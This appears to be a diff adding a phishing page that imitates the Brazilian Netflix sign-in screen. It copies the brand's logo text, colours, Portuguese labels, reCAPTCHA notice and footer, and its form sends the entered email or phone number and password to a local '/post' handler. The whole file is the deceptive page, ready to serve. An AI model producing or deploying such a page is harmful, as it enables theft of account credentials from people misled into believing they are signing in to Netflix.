@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Brasil - Entrar</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Netflix Sans', 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background: #141414;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            padding: 20px 40px;
+        }
+
+        .logo {
+            color: #E50914;
+            font-size: 32px;
+            font-weight: bold;
+            letter-spacing: -1px;
+        }
+
+        .main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.75);
+            border-radius: 4px;
+            padding: 60px 68px;
+            width: 100%;
+            max-width: 450px;
+        }
+
+        h1 {
+            color: #fff;
+            font-size: 32px;
+            margin-bottom: 28px;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px 20px;
+            background: #333;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+        }
+
+        input:focus {
+            outline: none;
+            background: #454545;
+        }
+
+        input::placeholder {
+            color: #8C8C8C;
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: #E50914;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 24px;
+        }
+
+        button:hover {
+            background: #F40612;
+        }
+
+        .remember {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 12px;
+        }
+
+        .remember label {
+            color: #B3B3B3;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .remember input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+        }
+
+        .remember a {
+            color: #B3B3B3;
+            font-size: 13px;
+            text-decoration: none;
+        }
+
+        .signup {
+            color: #737373;
+            font-size: 16px;
+            margin-top: 16px;
+        }
+
+        .signup a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .captcha {
+            color: #8C8C8C;
+            font-size: 13px;
+            margin-top: 16px;
+        }
+
+        .footer {
+            padding: 30px 40px;
+            background: rgba(0, 0, 0, 0.75);
+        }
+
+        .footer p {
+            color: #737373;
+            font-size: 13px;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <div class="logo">NETFLIX</div>
+    </div>
+    <div class="main">
+        <div class="container">
+            <h1>Entrar</h1>
+            <form action="/post" method="post">
+                <div class="form-group">
+                    <input type="text" name="user" placeholder="E-mail ou número de telefone" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="pass" placeholder="Senha" required>
+                </div>
+                <button type="submit">Entrar</button>
+                <div class="remember">
+                    <label><input type="checkbox"> Lembre-se de mim</label>
+                    <a href="#">Precisa de ajuda?</a>
+                </div>
+            </form>
+            <p class="signup">Novo por aqui? <a href="#">Assine agora</a>.</p>
+            <p class="captcha">Esta página é protegida pelo Google reCAPTCHA.</p>
+        </div>
+    </div>
+    <div class="footer">
+        <p>Netflix Brasil © 2024</p>
+    </div>
+</body>
+
+</html>
